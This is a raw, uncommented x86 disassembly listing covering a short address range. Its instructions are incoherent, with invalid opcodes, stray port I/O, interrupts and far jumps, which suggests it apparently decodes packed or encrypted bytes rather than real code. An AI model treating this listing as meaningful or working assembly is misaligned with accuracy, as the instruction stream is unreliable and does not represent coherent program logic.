  41780a:	add    bh,BYTE PTR [esi-0x4b2b2293]
  417810:	ret    0xfea
  417813:	inc    edi
  417814:	jno    0x4177b4
  417816:	bound  edi,QWORD PTR [ebx+ecx*8+0x60b563f6]
  41781d:	(bad)  
  41781f:	adc    BYTE PTR [edi-0x3fa24a7],dh
  417825:	xor    ebx,DWORD PTR ds:0x6f6353ac
  41782b:	cmp    esi,DWORD PTR [esi]
  41782d:	sub    eax,DWORD PTR [ebx+0x28b76e7c]
  417833:	xchg   DWORD PTR [ebp-0x4332027],ebx
  417839:	stos   BYTE PTR es:[edi],al
  41783a:	lahf   
  41783b:	push   eax
  41783c:	mov    ds:0x1d249a2e,eax
  417841:	stos   DWORD PTR es:[edi],eax
  417842:	mov    esp,0x554d0093
  417847:	add    ebx,DWORD PTR [edi+0x61]
  41784a:	add    al,0x99
  41784c:	jbe    0x417831
  41784e:	in     eax,dx
  41784f:	push   ebx
  417850:	outs   dx,DWORD PTR ds:[esi]
  417851:	xchg   esi,eax
  417852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417853:	mov    ecx,0x5168a2c1
  417858:	retf   0x46bb
  41785b:	xor    esi,DWORD PTR [ebx-0x50]
  41785e:	sub    bh,BYTE PTR [ebp-0x22]
  417861:	vpaddsw xmm7,xmm3,XMMWORD PTR [esi+eiz*8+0x6f3597ad]
  41786a:	pop    DWORD PTR ds:0x65b43874
  417870:	mov    WORD PTR [ebp-0x543aa82b],?
  417876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417877:	iret   
  417878:	or     eax,0xa32805ad
  41787d:	pushf  
  41787e:	ins    DWORD PTR es:[edi],dx
  41787f:	in     eax,0xf8
  417881:	inc    esi
  417882:	(bad)  
  417883:	loope  0x41787d
  417885:	retf   
  417886:	loopne 0x4178b0
  417888:	mov    bh,0x5b
  41788a:	pop    edx
  41788b:	mov    ds:0xbaf47c55,al
  417890:	inc    edx
  417891:	pushf  
  417892:	jae    0x4178a4
  417894:	jp     0x417877
  417896:	test   ax,0x9045
  41789a:	fild   DWORD PTR [esp+edx*4+0x346ff571]
  4178a1:	xchg   edx,eax
  4178a2:	adc    BYTE PTR [eax-0x4209aa80],al
  4178a8:	xor    al,0xab
  4178aa:	mov    ds:0xc839ff7,al
  4178af:	mov    BYTE PTR [edi+0x3d],bl
  4178b2:	inc    eax
  4178b3:	scas   al,BYTE PTR es:[edi]
  4178b4:	sub    dh,BYTE PTR [eax]
  4178b6:	and    eax,0xd9bc1ef5
  4178bb:	test   BYTE PTR [ebp-0x2f],cl
  4178be:	test   eax,0xbbb1f516
  4178c3:	cmp    eax,0x53547644
  4178c8:	push   edx
  4178c9:	pop    ebx
  4178ca:	pop    edx
  4178cb:	jecxz  0x417862
  4178cd:	test   al,0xbe
  4178cf:	and    eax,ecx
  4178d1:	aas    
  4178d2:	mov    bh,0x3
  4178d4:	fsin   
  4178d6:	stos   BYTE PTR es:[edi],al
  4178d7:	imul   ebx,DWORD PTR [ebx+0x51],0xc5a54e09
  4178de:	fstp   TBYTE PTR [ebp+0x31d5d2f3]
  4178e4:	jle    0x4178d2
  4178e6:	sub    eax,0xc45112ea
  4178eb:	push   edx
  4178ec:	mov    ah,0xd4
  4178ee:	push   edx
  4178ef:	stos   DWORD PTR es:[edi],eax
  4178f0:	outs   dx,BYTE PTR ds:[esi]
  4178f1:	cmc    
  4178f2:	sbb    ecx,DWORD PTR [eax+0x61addef0]
  4178f8:	out    dx,eax
  4178f9:	adc    edi,eax
  4178fb:	xor    DWORD PTR [esp+ebx*4],esp
  4178fe:	and    BYTE PTR [esp+eax*2],cl
  417901:	js     0x4178ca
  417903:	loope  0x417912
  417905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417906:	xchg   BYTE PTR [eax],dh
  417908:	push   cs
  417909:	(bad)  
  41790a:	mov    dh,0x8b
  41790c:	jmp    0x417983
  41790e:	mov    dl,0xcc
  417910:	sbb    eax,0xf4f60f97
  417915:	clc    
  417916:	scas   eax,DWORD PTR es:[edi]
  417917:	sahf   
  417918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417919:	jecxz  0x417967
  41791b:	and    eax,0x7e735e74
  417920:	mov    ebx,0xd3c0152e
  417925:	lds    ebp,FWORD PTR [ebp+ecx*2-0x3833a040]
  41792c:	or     BYTE PTR ds:0xd9c0b696,al
  417932:	ins    DWORD PTR es:[edi],dx
  417933:	ss int3 
  417935:	mov    edx,0x980bb6b7
  41793a:	je     0x41793e
  41793c:	inc    ecx
  41793d:	cmp    al,0xdd
  41793f:	jmp    0x8d588af8
  417944:	std    
  417945:	aaa    
  417946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417947:	inc    edi
  417948:	dec    ecx
  417949:	out    dx,al
  41794a:	xchg   BYTE PTR [edx-0x123a6278],al
  417950:	imul   ebx,DWORD PTR [edx+0x1cada1f7],0xffffffe1
  417957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417958:	add    ah,BYTE PTR [ebp-0x462c60b3]
  41795e:	adc    eax,DWORD PTR [ecx-0x7bc5f171]
  417964:	jl     0x4178fd
  417966:	cmp    ch,bl
  417968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417969:	cmp    ebx,DWORD PTR [esi+edx*4-0x61]
  41796d:	sub    BYTE PTR [ecx-0x2d],ah
  417970:	imul   edi,DWORD PTR [edi+0x22492727],0x87c2f3d1
  41797a:	in     al,0x50
  41797c:	add    ebp,DWORD PTR [ebp+0x76fe7d06]
  417982:	mov    ds:0x4813abe1,al
  417987:	adc    eax,0xd6c0d993
  41798c:	js     0x4179b7
  41798e:	rcr    DWORD PTR [ebx],0x8f
  417991:	scas   al,BYTE PTR es:[edi]
  417992:	push   edi
  417993:	les    esi,FWORD PTR ds:0xd780bb3
  417999:	lods   al,BYTE PTR ds:[esi]
  41799a:	jne    0x4179ac
  41799c:	mov    cs,WORD PTR [esi+0x1606cc6c]
  4179a2:	ffreep st(4)
  4179a4:	dec    ebx
  4179a5:	cmp    al,0x0
  4179a7:	test   al,0xcf
  4179a9:	pop    esi
  4179aa:	js     0x417a22
  4179ac:	retf   0x3cd0
  4179af:	je     0x417974
  4179b1:	rcr    BYTE PTR gs:[ebp*4+0x20e05d19],cl
  4179b9:	sbb    DWORD PTR [ebx],edi
  4179bb:	loopne 0x417973
  4179bd:	rcr    BYTE PTR [edi+0x6ce58d52],0xcf
  4179c4:	xor    ah,dh
  4179c6:	push   0x6c7c956c
  4179cb:	xchg   ebx,eax
  4179cc:	retf   
  4179cd:	jae    0x417981
  4179cf:	ins    BYTE PTR es:[edi],dx
  4179d0:	add    cl,BYTE PTR [ecx-0x200d9817]
  4179d6:	mov    cs,WORD PTR ds:0x892f9a10
  4179dc:	(bad)  
  4179dd:	stc    
  4179de:	sub    DWORD PTR [edx+0x33],esi
  4179e1:	pop    ebp
  4179e2:	xor    BYTE PTR [ebp-0xc646873],al
  4179e8:	hlt    
  4179e9:	das    
  4179ea:	icebp  
  4179eb:	inc    eax
  4179ec:	mov    ch,0xd6
  4179ee:	push   edi
  4179ef:	out    0x67,eax
  4179f1:	loope  0x417a0a
  4179f3:	(bad)  
  4179f4:	rcr    dh,1
  4179f6:	hlt    
  4179f7:	xor    BYTE PTR [ecx+0x6806a9c3],dl
  4179fd:	inc    edi
  4179fe:	je     0x417a0a
  417a00:	pop    ss
  417a01:	fiadd  DWORD PTR [edi+0x12]
  417a04:	(bad)  
  417a05:	push   eax
  417a06:	sub    eax,0xffb0bb7b
  417a0b:	cmp    DWORD PTR [ebx],eax
  417a0d:	addr16 int 0x8d
  417a10:	jns    0x4179fe
  417a12:	xchg   edx,eax
  417a13:	fldenv [edx+0x40]
  417a16:	and    dl,ah
  417a18:	dec    eax
  417a19:	jle    0x417a92
  417a1b:	sbb    dh,BYTE PTR [esi+0x38]
  417a1e:	jmp    0x9f8f:0xdb490abe
  417a25:	adc    eax,0xc9d8a449
  417a2a:	push   0xcf720954
  417a2f:	loopne 0x417a01
  417a31:	cmc    
  417a32:	jne    0x417a5c
  417a34:	add    al,0x1e
  417a36:	outs   dx,BYTE PTR ds:[esi]
  417a37:	mov    ah,bh
  417a39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a3a:	imul   ebp,DWORD PTR [edi+0x1065eacb],0x4935f923
  417a44:	jns    0x417a52
  417a46:	stos   DWORD PTR es:[edi],eax
  417a47:	loope  0x417a5b
  417a49:	ins    BYTE PTR es:[edi],dx
  417a4a:	pop    edx
  417a4b:	mov    bh,0x11
  417a4d:	and    BYTE PTR [ebp-0xc88e338],al
  417a53:	mov    edx,0xfd74f866
  417a58:	les    ebx,FWORD PTR [edi-0x3cdf4019]
  417a5e:	or     al,BYTE PTR [ecx-0x6cf127ca]
  417a64:	inc    ebp
  417a65:	pop    edi
  417a66:	cmp    ebx,esi
  417a68:	(bad)  
  417a69:	adc    ebp,DWORD PTR [edx-0x60699d13]
  417a6f:	mov    esp,0xd786d2e
  417a74:	jno    0x417adf
  417a76:	mov    ch,0x87
  417a78:	push   edi
  417a79:	mov    esi,0xc45e6ce3
  417a7e:	repz cld 
  417a80:	out    0x95,eax
  417a82:	cs xchg edi,eax
  417a84:	sbb    cl,BYTE PTR [ebp+0xa2f743e]
  417a8a:	sbb    edx,DWORD PTR [edi+0x19]
  417a8d:	rcr    DWORD PTR [edx],0xb1
  417a90:	(bad)  
  417a91:	xor    ebx,DWORD PTR [ecx]
  417a93:	bound  eax,QWORD PTR [ebx+0x32]
  417a96:	mov    bl,0x46
  417a98:	push   ebp
  417a99:	repz jno 0x417ab2
  417a9c:	jl     0x417a57
  417a9e:	loopne 0x417b03
  417aa0:	scas   al,BYTE PTR es:[edi]
  417aa1:	xchg   ecx,eax
  417aa2:	int3   
  417aa3:	rcl    DWORD PTR [edi+0x4a],cl
  417aa6:	enter  0x154d,0x90
  417aaa:	and    ecx,esi
  417aac:	xchg   ch,dh
  417aae:	lods   eax,DWORD PTR ds:[esi]
  417aaf:	aad    0x32
  417ab1:	adc    DWORD PTR [ecx-0x1a80b1dc],0x3d
  417ab8:	sbb    BYTE PTR [ecx+0x59d29fdb],0xe2
  417abf:	xchg   ecx,eax
  417ac0:	ret    0x3360
  417ac3:	int    0x5b
  417ac5:	mov    ch,0x94
  417ac7:	int    0xcc
  417ac9:	mul    BYTE PTR ds:0x8b8fdb8e
  417acf:	pop    edi
  417ad0:	pop    ss
  417ad1:	not    DWORD PTR [ecx+eax*4+0x10f71885]
  417ad8:	push   0xfffffff8
  417ada:	add    al,0x22
  417adc:	lds    esp,FWORD PTR gs:[ebx-0x735d76e5]
  417ae3:	retf   0x2002
  417ae6:	fs popf 
  417ae8:	daa    
  417ae9:	mov    dl,0x81
  417aeb:	add    DWORD PTR [edx],edx
  417aed:	int3   
  417aee:	js     0x417b22
  417af0:	or     eax,0xd800a023
  417af5:	ja     0x417b6d
  417af7:	cmc    
  417af8:	inc    esi
  417af9:	ror    eax,0x4
  417afc:	adc    cl,BYTE PTR [edi]
  417afe:	into   
  417aff:	jg     0x417b35
  417b01:	dec    eax
  417b02:	or     eax,DWORD PTR [edx+0x2b]
  417b05:	outs   dx,DWORD PTR ds:[esi]
  417b06:	fldl2e 
  417b08:	lods   al,BYTE PTR ds:[esi]
  417b09:	dec    ebx
  417b0a:	dec    esp
  417b0b:	cdq    
  417b0c:	out    dx,eax
  417b0d:	or     DWORD PTR [edi+0x784cf3c2],ecx
  417b13:	call   0x448c:0xbf98aa4
  417b1a:	not    BYTE PTR [eax+0x2b]
  417b1d:	popa   
  417b1e:	js     0x417ae7
  417b20:	loope  0x417b82
  417b22:	inc    ebp
  417b23:	jmp    0x417afd
  417b25:	push   esp
  417b26:	inc    esi
  417b27:	add    eax,0x63cdc1b9
  417b2c:	outs   dx,DWORD PTR ds:[esi]
  417b2d:	xchg   edi,eax
  417b2e:	push   ebp
  417b2f:	pop    ds
  417b30:	stos   DWORD PTR es:[edi],eax
  417b31:	jmp    0xbbfe:0xfad8af5d
  417b38:	addr16 inc ebx
  417b3a:	retf   0x1b9b
  417b3d:	push   eax
  417b3e:	push   0x57
  417b40:	repz mov eax,ds:0xaf714ef5
  417b46:	jg     0x417ace
  417b48:	dec    esp
  417b49:	jno    0x417b4f
  417b4b:	inc    edx
  417b4c:	addr16 jg 0x417b53
  417b4f:	xchg   ebx,eax
  417b50:	inc    ebp
  417b51:	add    DWORD PTR ds:[ecx],esi
  417b54:	xchg   ebx,eax
  417b55:	(bad)  
  417b57:	dec    esp
  417b58:	jmp    0x742e:0x7d104816
  417b5f:	dec    ebp
  417b60:	sub    al,0x79
  417b62:	jl     0x417b23
  417b64:	xlat   BYTE PTR ds:[ebx]
  417b65:	adc    eax,0x619da283
  417b6a:	adc    edi,edx
  417b6c:	and    BYTE PTR [esi+esi*2],cl
  417b6f:	lea    ecx,[edx+0x5b07359e]
  417b75:	xor    esi,DWORD PTR [edx-0x54c4fc1b]
  417b7b:	lods   eax,DWORD PTR ds:[esi]
  417b7c:	mov    ecx,0xac9c87c8
  417b81:	pop    ds
  417b82:	cmp    al,0xa7
  417b84:	sar    BYTE PTR [ecx+0x705da7ef],1
  417b8a:	xor    DWORD PTR [edi],edi
  417b8c:	inc    edi
  417b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b8e:	retf   
  417b8f:	inc    esi
  417b90:	into   
  417b91:	into   
  417b92:	in     eax,dx
  417b93:	dec    ebx
  417b94:	xchg   ecx,eax
  417b95:	out    dx,eax
  417b96:	sahf   
  417b97:	repnz popa 
  417b99:	cmp    al,bl
  417b9b:	shr    BYTE PTR [ecx+0x50],0xb
  417b9f:	mov    ds:0xa3acfd14,al
  417ba4:	fisttp DWORD PTR [ecx-0x23]
  417ba7:	or     dl,ch
  417ba9:	mov    ebp,0x838a3b0b
  417bae:	lds    ebp,FWORD PTR [ecx]
  417bb0:	retf   
  417bb1:	adc    ch,BYTE PTR [ebp-0x59]
  417bb4:	mov    ebp,0x18241b53
  417bb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bba:	popf   
  417bbb:	mov    ds:0x171a118e,al
  417bc0:	or     eax,0x8b495935
  417bc5:	xchg   ecx,esp
  417bc7:	push   esp
  417bc8:	repz sbb DWORD PTR [edi],0x76462bad
  417bcf:	xor    eax,0xd30702d2
  417bd4:	out    dx,eax
  417bd5:	test   BYTE PTR [ecx-0x25],0x8f
  417bd9:	sti    
  417bda:	out    dx,eax
  417bdb:	inc    eax
  417bdc:	sahf   
  417bdd:	and    dh,BYTE PTR ds:0x57e45b7
  417be3:	push   esp
  417be4:	adc    bl,al
  417be6:	add    dh,dh
  417be8:	add    al,0xe
  417bea:	retf   0x91e6
  417bed:	jmp    0x417bd1
  417bef:	mov    cs,WORD PTR [edi+0x3a5efa64]
  417bf5:	pop    esi
  417bf6:	out    dx,al
  417bf7:	xchg   edx,eax
  417bf8:	lea    esi,[esi+0x1a8cae70]
  417bfe:	xor    eax,0xe713009
  417c03:	repz cwde 
  417c05:	cmp    al,0x23
  417c07:	xor    eax,0xcb1dffcb
  417c0c:	jmp    0x417c87
  417c0e:	ds jecxz 0x417bbd
  417c11:	div    BYTE PTR [edx+0x4f30a459]
  417c17:	xchg   ebp,eax
  417c18:	outs   dx,BYTE PTR ds:[esi]
  417c19:	or     bl,dh
  417c1b:	and    eax,0xe918370b
  417c20:	in     eax,dx
  417c21:	push   DWORD PTR [esi+0x2204f9dd]
  417c27:	and    ah,BYTE PTR [ecx-0x2919aaa4]
  417c2d:	test   DWORD PTR [esi+0x3caef45b],ebx
  417c33:	jmp    0x2bffd6e6
  417c38:	mov    bh,0xb0
  417c3a:	inc    edx
  417c3b:	lea    edi,ds:0xe8d20a1b
  417c41:	das    
  417c42:	cmp    BYTE PTR [ebx+edi*2-0xa],0xe8
  417c47:	push   es
  417c48:	pop    eax
  417c49:	ret    0x4ab4
  417c4c:	les    esp,FWORD PTR [edx]
  417c4e:	sub    al,0x9c
  417c50:	xor    esi,DWORD PTR [ecx-0x187bb5ab]
  417c56:	aam    0xe
  417c58:	dec    ebp
  417c59:	mov    BYTE PTR [edx-0x5e],ah
  417c5c:	inc    ebx
  417c5d:	push   cs
  417c5e:	sbb    eax,0xcdbacb33
  417c63:	out    dx,al
  417c64:	lea    esp,[ecx]
  417c66:	dec    eax
  417c67:	into   
  417c68:	iret   
  417c69:	push   edx
  417c6a:	mov    edx,0xd75b9956
  417c6f:	cmp    BYTE PTR [esi+edi*2-0x1d],cl
  417c73:	sub    BYTE PTR [ebp-0x7c252b52],dl
  417c79:	mov    ebp,0xe85797e8
  417c7e:	stos   DWORD PTR es:[edi],eax
  417c7f:	and    al,0x84
  417c81:	jmp    0xb6cf7175
  417c86:	jle    0x417c26
  417c88:	push   es
  417c89:	xor    eax,DWORD PTR [ecx]
  417c8b:	inc    esi
  417c8c:	cwde   
  417c8d:	cli    
  417c8e:	mov    ds:0xd09bc874,al
  417c93:	loop   0x417cfc
  417c95:	and    al,0x8
  417c97:	sub    ebx,DWORD PTR [ebx]
  417c99:	fisttp QWORD PTR [edx-0x32]
  417c9c:	(bad)  
  417c9d:	pop    ds
  417c9e:	jge    0x417c21
  417ca0:	add    BYTE PTR [ebx+eax*4],ch
  417ca3:	pop    esp
  417ca4:	xchg   ecx,eax
  417ca5:	sub    DWORD PTR [esi-0x333c02bb],0xf347f963
  417caf:	and    BYTE PTR [eax-0x329dc2b3],ah
  417cb5:	add    eax,0x3d8d2502
  417cba:	mov    esi,0xb3513fde
  417cbf:	add    eax,0xb0c42cd8
  417cc4:	or     al,0x87
  417cc6:	in     eax,0x66
  417cc8:	ja     0x417cfd
  417cca:	sbb    dh,ch
  417ccc:	inc    edi
  417ccd:	addr16 push 0x445c44d7
  417cd3:	stos   BYTE PTR es:[edi],al
  417cd4:	ds push ss
  417cd6:	or     edx,edx
  417cd8:	sbb    al,0x68
  417cda:	clc    
  417cdb:	xchg   esi,eax
  417cdc:	sub    ecx,esi
  417cde:	push   ss
  417cdf:	and    al,BYTE PTR [ecx+0x197c8768]
  417ce5:	or     eax,0x54890883
  417cea:	push   eax
  417ceb:	xor    ecx,DWORD PTR [esi-0x18b0aced]
  417cf1:	xchg   ecx,eax
  417cf2:	cdq    
  417cf3:	inc    ecx
  417cf4:	pop    esp
  417cf5:	mov    ebp,0x5220cab
  417cfa:	inc    edx
  417cfb:	adc    dl,BYTE PTR [ecx+esi*1]
  417cfe:	call   0xa5a5ce54
  417d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d04:	push   ebx
  417d05:	in     eax,dx
  417d06:	dec    ebx
  417d07:	xlat   BYTE PTR ds:[ebx]
  417d08:	pop    esi
  417d09:	push   edi
  417d0a:	dec    esi
  417d0b:	ja     0x417cf9
  417d0d:	shl    BYTE PTR [ecx+edi*1],cl
  417d10:	or     DWORD PTR [esi],edi
  417d12:	int    0x29
  417d14:	pop    es
  417d15:	scas   al,BYTE PTR es:[edi]
  417d16:	inc    ecx
  417d17:	push   0x2cdf8fe6
  417d1c:	arpl   WORD PTR [eax+edx*8],cx
  417d1f:	and    edi,DWORD PTR [ebx-0x2]
  417d22:	(bad)  
  417d23:	cwde   
  417d24:	xor    al,BYTE PTR [edi]
  417d26:	mov    ah,0xc8
  417d28:	jb     0x417d0a
  417d2a:	call   0xa43cd1a2
  417d2f:	jbe    0x417d77
  417d31:	(bad)  
  417d32:	cs ret 0xc0bf
  417d36:	jb     0x417d8f
  417d38:	loopne 0x417cd3
  417d3a:	sub    cl,ch
  417d3c:	(bad)  
  417d3d:	shl    BYTE PTR [eax],cl
  417d3f:	sub    al,0x3b
  417d41:	inc    esp
  417d42:	or     al,0x47
  417d44:	cmp    BYTE PTR [ecx+0x33],bl
  417d47:	hlt    
  417d48:	retf   0x5832
  417d4b:	enter  0xdb88,0x11
  417d4f:	sub    dh,ch
  417d51:	lock test eax,0xc8f6807b
  417d57:	pusha  
  417d58:	clc    
  417d59:	xor    BYTE PTR [esi],ah
  417d5b:	mov    fs,edi
  417d5d:	inc    edi
  417d5e:	xchg   esi,eax
  417d5f:	daa    
  417d60:	mov    WORD PTR [esi],fs
  417d62:	jl     0x417ceb
  417d64:	dec    ecx
  417d65:	mov    bl,BYTE PTR [eax]
  417d67:	cld    
  417d68:	push   esp
  417d69:	dec    edi
  417d6a:	push   edi
  417d6b:	push   ecx
  417d6c:	cmp    edx,ebp
  417d6e:	xchg   BYTE PTR [eax-0x2e],al
  417d71:	mov    eax,0x8ec6fb97
  417d76:	pop    edi
  417d77:	inc    esi
  417d78:	jge    0x417d5c
  417d7a:	hlt    
  417d7b:	shl    DWORD PTR [eax-0xd],0xdf
  417d7f:	xor    eax,ebp
  417d81:	(bad)  
  417d82:	xchg   ebp,eax
  417d83:	mov    WORD PTR [ebx-0x64],ds
  417d86:	test   BYTE PTR [edi+0x27],0xe9
  417d8a:	and    eax,0x3cdf03e6
  417d8f:	mov    bh,0xef
  417d91:	fidivr DWORD PTR [eax-0x1]
  417d94:	(bad)  
  417d95:	(bad)  
  417d96:	addr16 ret 0x8f68
  417d9a:	lods   al,BYTE PTR ds:[esi]
  417d9b:	dec    esp
  417d9c:	inc    esp
  417d9d:	push   cs
  417d9e:	inc    ecx
  417d9f:	xor    DWORD PTR [esi+0x2046b7df],0x99ee155f
  417da9:	xchg   esi,eax
  417daa:	xor    eax,0xe216d6a3
  417daf:	daa    
  417db0:	stos   DWORD PTR es:[edi],eax
  417db1:	mov    esi,0x3039e5dd
  417db6:	es ins DWORD PTR es:[edi],dx
  417db8:	push   es
  417db9:	mov    edi,0xdf85947b
  417dbe:	mov    esi,0x1574f56b
  417dc3:	sbb    cl,cl
  417dc5:	in     al,0xe4
  417dc7:	bound  ebx,QWORD PTR [eax]
  417dc9:	popf   
  417dca:	int    0xcd
  417dcc:	adc    al,0x5
  417dce:	enter  0xe0a8,0x65
  417dd2:	or     edi,DWORD PTR [ebx+0x1f870305]
  417dd8:	jns    0x417e2a
  417dda:	jb     0x417d89
  417ddc:	ins    BYTE PTR es:[edi],dx
  417ddd:	scas   eax,DWORD PTR es:[edi]
  417dde:	call   0xa9e1:0xae070c60
  417de5:	inc    ebp
  417de6:	sar    DWORD PTR [esi-0x5188c870],0x1
  417ded:	hlt    
  417dee:	int    0xc0
  417df0:	imul   esi,edx,0xcc845c67
  417df6:	add    DWORD PTR [esi],edx
  417df8:	in     al,0x17
  417dfa:	sar    BYTE PTR [ebx-0x3230a631],0x97
  417e01:	fldenv [esi-0x28]
  417e04:	popf   
  417e05:	or     bl,BYTE PTR [edx+0x1e7a6b32]
  417e0b:	sub    dl,ah
  417e0d:	mov    eax,0xce955b48
  417e12:	repnz xchg esp,eax
  417e14:	jbe    0x417e3b
  417e16:	pop    es
  417e17:	mov    ds:0x8a6c697a,eax
  417e1c:	ret    0x1b6b
  417e1f:	pop    ss
  417e20:	mov    dh,0x46
  417e22:	mov    cl,BYTE PTR [eax-0x4]
  417e25:	fwait
  417e26:	and    bh,ah
  417e28:	repz cli 
  417e2a:	inc    esp
  417e2b:	test   DWORD PTR [ebx],esi
  417e2d:	stos   DWORD PTR es:[edi],eax
  417e2e:	jno    0x417e9a
  417e30:	sahf   
  417e31:	in     eax,dx
  417e32:	clc    
  417e33:	or     dh,BYTE PTR [ebx]
  417e35:	imul   edi,DWORD PTR [ecx-0x72],0xffffffaf
  417e39:	mov    cl,0x35
  417e3b:	mov    ds:0xd9c1ad8d,eax
  417e40:	call   0x3ba:0x156ed94e
  417e47:	sbb    esp,DWORD PTR [ebx-0x36]
  417e4a:	cmp    ecx,0x65868334
  417e50:	nop
  417e51:	xchg   ebx,eax
  417e52:	mov    dh,0xdd
  417e54:	jo     0x417e71
  417e56:	xchg   DWORD PTR [esi],edx
  417e58:	lods   eax,DWORD PTR ds:[esi]
  417e59:	ins    DWORD PTR es:[edi],dx
  417e5a:	xlat   BYTE PTR ds:[ebx]
  417e5b:	cmp    al,0x92
  417e5d:	test   BYTE PTR [ebx-0x16],ch
  417e60:	pushf  
  417e61:	jnp    0x417e11
  417e63:	sbb    ah,BYTE PTR [ebx+0x5f9cd44]
  417e69:	and    eax,0xfd7ab9b8
  417e6e:	(bad)  
  417e6f:	aas    
  417e70:	jp     0x417e0a
  417e72:	das    
  417e73:	mov    ds:0xc6844896,eax
  417e78:	cmc    
  417e79:	mov    edi,0xac88b736
  417e7e:	aad    0xca
  417e80:	jb     0x417e55
  417e82:	pop    ebp
  417e83:	xchg   ch,dh
  417e85:	lods   al,BYTE PTR ds:[esi]
  417e86:	cmp    ebx,edi
  417e88:	xlat   BYTE PTR ds:[ebx]
  417e89:	mov    edx,0x5b1e97ce
  417e8e:	sbb    BYTE PTR es:[bx],0xae
  417e93:	jecxz  0x417ecb
  417e95:	scas   eax,DWORD PTR es:[edi]
  417e96:	dec    ecx
  417e97:	or     DWORD PTR [edx-0xb],esi
  417e9a:	sbb    DWORD PTR [ecx+0x4c],ebp
  417e9d:	les    esi,FWORD PTR [eax-0x36266647]
  417ea3:	push   eax
  417ea4:	pusha  
  417ea5:	leave  
  417ea6:	adc    edi,DWORD PTR [esi+0x1]
  417ea9:	shl    ah,1
  417eab:	js     0x417f1e
  417ead:	xchg   DWORD PTR ss:[edi+ebx*8+0x50],ebx
  417eb2:	mov    ?,WORD PTR [edx]
  417eb4:	xlat   BYTE PTR ds:[ebx]
  417eb5:	sub    BYTE PTR [edi],ah
  417eb7:	add    DWORD PTR [edx],edi
  417eb9:	jmp    0x74c41eaf
  417ebe:	jne    0x417ec1
  417ec0:	das    
  417ec1:	cld    
  417ec2:	xchg   DWORD PTR [eax+eax*4],esp
  417ec5:	outs   dx,DWORD PTR ds:[esi]
  417ec6:	mov    eax,ds:0xf4696f43
  417ecb:	clc    
  417ecc:	inc    edx
  417ecd:	repz pop eax
  417ecf:	fsubr  QWORD PTR [ecx+0x3c8dd88b]
  417ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ed6:	add    DWORD PTR [esi+ecx*4],ecx
  417ed9:	xchg   ecx,eax
  417eda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417edb:	add    esp,DWORD PTR [edi-0x1c]
  417ede:	mov    eax,ds:0x5a20838
  417ee3:	and    ch,BYTE PTR [bp+di-0x3982]
  417ee8:	enter  0x3545,0x2b
  417eec:	xchg   ebx,eax
  417eed:	dec    edi
  417eee:	and    eax,DWORD PTR [edx+edx*8-0x35]
  417ef2:	lea    esp,[esi-0x9bc6bc4]
  417ef8:	mov    ch,0xd5
  417efa:	call   0x4e8d:0xb919320f
  417f01:	sub    dh,BYTE PTR [edx+0x15]
  417f04:	xchg   esp,eax
  417f05:	outs   dx,BYTE PTR ds:[esi]
  417f06:	xchg   dh,ch
  417f08:	sti    
  417f09:	jne    0x417f26
  417f0b:	out    0x29,al
  417f0d:	sbb    bl,bl
  417f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f10:	cli    
  417f11:	dec    edx
  417f12:	mov    ah,0x22
  417f14:	or     ebx,eax
  417f16:	pop    edx
  417f17:	aad    0x34
  417f19:	push   edi
  417f1a:	rcr    BYTE PTR [eax+ecx*2-0x100c343],0xb8
  417f22:	xchg   BYTE PTR ds:[edi-0x8],cl
  417f26:	fyl2xp1 
  417f28:	inc    edx
  417f29:	mov    bl,dh
  417f2b:	add    bl,BYTE PTR [esi-0x53]
  417f2e:	push   ecx
  417f2f:	test   BYTE PTR [ebp-0x49],ch
  417f32:	add    al,0x97
  417f34:	mov    esi,0x13021b60
  417f39:	rcl    edi,0xa8
  417f3c:	push   es
  417f3d:	jmp    0xfbad:0x9e52254d
  417f44:	inc    edx
  417f45:	shl    ebx,1
  417f47:	sub    ebp,esp
  417f49:	add    esi,esp
  417f4b:	or     bl,BYTE PTR ds:0x325d57b2
  417f51:	push   es
  417f52:	mov    dh,0xec
  417f54:	adc    DWORD PTR fs:[esi-0x5c],0xffffff80
  417f59:	jbe    0x417f41
  417f5b:	xor    al,ah
  417f5d:	fisttp QWORD PTR [edx+0x16]
  417f60:	mov    BYTE PTR [ebp+eax*8+0xf],cl
  417f64:	xor    eax,0x4f7a2cff
  417f69:	data16 jmp 0x417f46
  417f6c:	mov    ebp,DWORD PTR [edx-0x55]
  417f6f:	inc    ebx
  417f70:	xchg   DWORD PTR [edi],eax
  417f72:	inc    esi
  417f73:	mov    ebx,0x27aa9d4b
  417f78:	jnp    0x417f49
  417f7a:	mov    dl,0x8f
  417f7c:	jl     0x417fe2
  417f7e:	adc    bh,BYTE PTR [esi]
  417f80:	xchg   edi,eax
  417f81:	xor    bl,0x1d
  417f84:	imul   DWORD PTR ds:0x79526cfc
  417f8a:	inc    edx
  417f8b:	xor    BYTE PTR [ecx-0xd],bl
  417f8e:	and    BYTE PTR [esi+0x4a18ffc6],ah
  417f94:	mov    esi,0x9478d10
  417f99:	sti    
  417f9a:	ret    
  417f9b:	mov    WORD PTR [esi-0x12c975e9],?
  417fa1:	dec    esp
  417fa2:	hlt    
  417fa3:	enter  0x7765,0x93
  417fa7:	aad    0x9c
  417fa9:	outs   dx,DWORD PTR ds:[esi]
  417faa:	add    eax,0xae69bbb
  417faf:	loope  0x417f88
  417fb1:	mov    ebp,0x6500a71e
  417fb6:	pop    ecx
  417fb7:	xor    DWORD PTR [ebp-0x211adb09],eax
  417fbd:	stos   DWORD PTR es:[edi],eax
  417fbe:	int3   
  417fbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fc0:	dec    edi
  417fc1:	cmp    DWORD PTR [ecx],0xcc974684
  417fc7:	int    0xb1
